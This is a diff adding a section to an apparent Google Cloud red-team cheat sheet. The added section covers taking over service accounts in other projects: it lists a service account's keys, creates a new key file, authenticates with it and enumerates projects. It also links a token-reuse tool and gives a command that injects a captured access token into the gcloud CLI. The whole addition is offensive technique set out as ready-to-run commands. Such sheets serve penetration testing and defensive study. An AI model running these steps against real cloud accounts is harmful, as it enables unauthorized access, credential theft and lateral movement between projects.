@@ -13,9 +13,36 @@
 gcloud projects add-iam-policy-binding <project name> --member user:<email address> --role roles/editor
 ```
 
+## To other projects
+### Take over service accounts
+- Roles: `roles/iam.serviceAccountAdmin`, `roles/iam.serviceAccountKeyAdmin`
+- Permissions: `iam.serviceAccountkeys.create`
+
+#### List keys associated with the specified service account
+```
+gcloud iam service-accounts keys list --iam-account <SERVICE ACCOUNT ID>
+```
+
+#### Create a new key for specified service account.
+- Saves credentials in `key.json`
+```
+gcloud iam service-accounts keys create key.json --iam-account <SERVICE ACCOUNT ID>
+```
+
+#### Authenticate with key file
+```
+gcloud auth activate-service-account --key-file key.json
+```
+
+#### List projects
+```
+gcloud projects list
+```
+
 ## Acess tokens
 #### Inject access token in gcloud CLI
 - Use `-D` to delete the access token
+- https://github.com/RedTeamOperations/GCPTokenReuse
 ```
 python3 /opt/gc/GCPTokenReuse/Gcp-Token-Updater.py -I --access-token "<ACCESS TOKEN>" --account-name <ACCOUNT EMAIL>
 ```
